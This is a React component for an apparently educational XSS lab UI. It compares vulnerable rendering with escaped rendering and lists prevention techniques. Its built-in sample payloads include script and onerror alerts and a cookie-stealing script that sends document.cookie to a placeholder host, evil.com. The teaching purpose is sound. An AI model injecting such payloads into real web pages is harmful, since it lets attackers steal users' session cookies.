import { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { Code, AlertTriangle, Shield, Play, CheckCircle, XCircle, Eye, EyeOff } from 'lucide-react'
import api from '../../lib/api.js'
import toast from 'react-hot-toast'

const quickPayloads = [
  { label: 'Script Tag',    value: '<script>alert("XSS Attack!")</script>' },
  { label: 'Image OnError', value: '<img src=x onerror="alert(\'Hacked!\')">' },
  { label: 'Cookie Steal',  value: '<script>fetch("https://evil.com?c="+document.cookie)</script>' },
  { label: 'Safe Input',    value: 'Hello! I am a normal user comment.' },
]

export default function XSSLab() {
  const [payload, setPayload] = useState('')
  const [mode, setMode] = useState('vulnerable')
  const [result, setResult] = useState(null)
  const [loading, setLoading] = useState(false)
  const [showUnsafe, setShowUnsafe] = useState(false)

  const run = async () => {
    if (!payload.trim()) return toast.error('Enter a payload to test')
    setLoading(true)
    try {
      const { data } = await api.post('/simulations/xss', { payload, mode })
      setResult(data)
    } catch {
      toast.error('Simulation failed. Is the backend running?')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div>
      <div className="glass-card p-xl mb-lg">
        <div className="flex items-center gap-md mb-md">
          <div className="feature-icon" style={{ background: 'rgba(255,204,0,0.12)', color: 'var(--clr-yellow)', borderColor: 'rgba(255,204,0,0.2)' }}>
            <Code size={22} />
          </div>
          <div>
            <h2 style={{ fontSize: '1.2rem', marginBottom: 2 }}>Cross-Site Scripting (XSS) Laboratory</h2>
            <div className="flex items-center gap-sm">
              <span className="badge badge-yellow">OWASP #3</span>
              <span className="badge badge-cyan">CVSS 8.8</span>
              <span className="badge badge-green">Safe Sandbox</span>
            </div>
          </div>
        </div>
        <p className="text-muted text-sm" style={{ lineHeight: 1.7 }}>
          XSS attacks inject malicious scripts into web pages viewed by other users. Test how a vulnerable
          application renders unsafe HTML vs how a secure application escapes it before display.
          <strong style={{ color: 'var(--clr-yellow)' }}> No scripts are actually executed</strong> — all rendering is simulated textually.
        </p>
      </div>

      <div className="sim-layout">
        {/* LEFT */}
        <div>
          {/* Mode */}
          <div className="glass-card p-lg mb-lg">
            <p style={{ fontSize: '0.8rem', fontWeight: 700, color: 'var(--clr-text-2)', marginBottom: '0.75rem', textTransform: 'uppercase', letterSpacing: '0.08em' }}>
              Rendering Mode
            </p>
            <div className="flex gap-sm">
              {['vulnerable', 'secure'].map(m => (
                <button key={m} id={`xss-mode-${m}`} onClick={() => { setMode(m); setResult(null) }}
                  className={m === mode ? 'btn btn-primary btn-sm' : 'btn btn-ghost btn-sm'}
                  style={{ flex: 1, textTransform: 'capitalize' }}>
                  {m === 'vulnerable' ? <><AlertTriangle size={13} /> Vulnerable</> : <><Shield size={13} /> Secure</>}
                </button>
              ))}
            </div>
          </div>

          {/* Quick payloads */}
          <div className="glass-card p-lg mb-lg">
            <p style={{ fontSize: '0.8rem', fontWeight: 700, color: 'var(--clr-text-2)', marginBottom: '0.75rem', textTransform: 'uppercase', letterSpacing: '0.08em' }}>
              Test Payloads
            </p>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
              {quickPayloads.map(p => (
                <button key={p.label} id={`xss-payload-${p.label.replace(/\s+/g,'-').toLowerCase()}`}
                  onClick={() => { setPayload(p.value); setResult(null) }}
                  className="btn btn-ghost btn-sm"
                  style={{ justifyContent: 'flex-start', fontFamily: 'var(--font-mono)', fontSize: '0.72rem', textAlign: 'left' }}>
                  <span style={{ color: 'var(--clr-text-3)', flexShrink: 0 }}>{p.label}:</span>
                  <span style={{ color: 'var(--clr-yellow)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{p.value}</span>
                </button>
              ))}
            </div>
          </div>

          {/* Input */}
          <div className="glass-card p-lg">
            <p style={{ fontSize: '0.8rem', fontWeight: 700, color: 'var(--clr-text-2)', marginBottom: '0.75rem', textTransform: 'uppercase', letterSpacing: '0.08em' }}>
              User Input / Comment
            </p>
            <textarea
              id="xss-payload-input"
              className="cyber-input"
              rows={5}
              value={payload}
              onChange={e => setPayload(e.target.value)}
              placeholder="Enter HTML, JavaScript, or plain text..."
              style={{ resize: 'vertical', fontFamily: 'var(--font-mono)', fontSize: '0.82rem' }}
            />
            <motion.button whileTap={{ scale: 0.97 }} onClick={run} disabled={loading}
              className="btn btn-primary w-full mt-md" id="xss-run-btn">
              {loading
                ? <motion.div animate={{ rotate: 360 }} transition={{ duration: 1, repeat: Infinity, ease: 'linear' }}><Play size={16} /></motion.div>
                : <><Play size={16} /> Test Rendering</>}
            </motion.button>
          </div>
        </div>

        {/* RIGHT */}
        <div>
          <AnimatePresence mode="wait">
            {result ? (
              <motion.div key="res" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0 }}
                style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>

                {/* Detection */}
                <div className="glass-card p-lg" style={{ borderColor: result.inputAnalysis.isXSSDetected ? 'rgba(255,204,0,0.3)' : 'rgba(0,255,136,0.3)' }}>
                  <div className="flex items-center justify-between mb-md">
                    <p className="text-xs text-muted" style={{ textTransform: 'uppercase', letterSpacing: '0.08em' }}>XSS Detection</p>
                    <span style={{ fontFamily: 'var(--font-hud)', fontSize: '0.75rem', color: result.inputAnalysis.isXSSDetected ? 'var(--clr-red)' : 'var(--clr-green)' }}>
                      {result.inputAnalysis.riskLevel}
                    </span>
                  </div>
                  {result.inputAnalysis.detectedPatterns.length > 0
                    ? result.inputAnalysis.detectedPatterns.map(p => (
                        <div key={p} className="flex items-center gap-sm mt-sm">
                          <AlertTriangle size={12} color="var(--clr-yellow)" />
                          <span className="text-xs" style={{ color: 'var(--clr-yellow)' }}>{p}</span>
                        </div>))
                    : <div className="flex items-center gap-sm"><CheckCircle size={12} color="var(--clr-green)" /><span className="text-xs" style={{ color: 'var(--clr-green)' }}>Clean input — no XSS patterns</span></div>
                  }
                  {result.inputAnalysis.xssType !== 'None' && (
                    <div className="mt-sm"><span className="badge badge-yellow" style={{ fontSize: '0.6rem' }}>{result.inputAnalysis.xssType}</span></div>
                  )}
                </div>

                {/* Rendering comparison */}
                <div className="glass-card p-lg">
                  <p className="text-xs text-muted mb-md" style={{ textTransform: 'uppercase', letterSpacing: '0.08em' }}>Rendering Comparison</p>

                  <div className="terminal mb-md">
                    <div className="terminal-header">
                      <div className="terminal-dot red" /><div className="terminal-dot yellow" /><div className="terminal-dot green" />
                      <span className="terminal-title">⚠ UNSAFE — innerHTML (vulnerable)</span>
                    </div>
                    <div className="terminal-body">
                      <div className="terminal-line">
                        <span className="prompt">$</span> <span className="cmd">render(userInput, {'{'} escape: false {'}'});</span>
                      </div>
                      <div className="terminal-line mt-sm">
                        <span style={{ color: result.inputAnalysis.isXSSDetected ? 'var(--clr-red)' : 'var(--clr-text-1)', fontFamily: 'var(--font-mono)', fontSize: '0.78rem', wordBreak: 'break-all' }}>
                          {result.rendering.unsafe}
                        </span>
                      </div>
                      {result.inputAnalysis.isXSSDetected && (
                        <div className="terminal-line mt-sm">
                          <span className="error">↳ Script would execute in victim browser!</span>
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="terminal">
                    <div className="terminal-header">
                      <div className="terminal-dot red" /><div className="terminal-dot yellow" /><div className="terminal-dot green" />
                      <span className="terminal-title">✓ SAFE — textContent (secure)</span>
                    </div>
                    <div className="terminal-body">
                      <div className="terminal-line">
                        <span className="prompt">$</span> <span className="cmd">render(encode(userInput), {'{'} escape: true {'}'});</span>
                      </div>
                      <div className="terminal-line mt-sm">
                        <span style={{ color: 'var(--clr-green)', fontFamily: 'var(--font-mono)', fontSize: '0.78rem', wordBreak: 'break-all' }}>
                          {result.rendering.safe}
                        </span>
                      </div>
                      <div className="terminal-line mt-sm">
                        <span className="output" style={{ color: 'var(--clr-green)' }}>✓ Rendered as literal text — attack neutralized</span>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Prevention */}
                <div className="glass-card p-lg" style={{ borderColor: 'rgba(0,255,136,0.2)' }}>
                  <div className="flex items-center gap-sm mb-md">
                    <Shield size={16} color="var(--clr-green)" />
                    <span style={{ fontWeight: 700, fontSize: '0.9rem', color: 'var(--clr-green)' }}>Prevention Techniques</span>
                  </div>
                  <ul style={{ listStyle: 'none', display: 'flex', flexDirection: 'column', gap: '0.4rem' }}>
                    {result.prevention.methods.map(m => (
                      <li key={m} className="flex items-center gap-sm">
                        <CheckCircle size={11} color="var(--clr-green)" style={{ flexShrink: 0 }} />
                        <span className="text-xs text-muted">{m}</span>
                      </li>
                    ))}
                  </ul>
                </div>
              </motion.div>
            ) : (
              <motion.div key="empty" initial={{ opacity: 0 }} animate={{ opacity: 1 }}
                className="glass-card scan-line"
                style={{ minHeight: 400, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: '1rem' }}>
                <Code size={48} color="var(--clr-text-3)" />
                <p className="text-muted text-sm">Enter a payload and run the simulation</p>
                <div className="terminal-cursor" />
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    </div>
  )
}
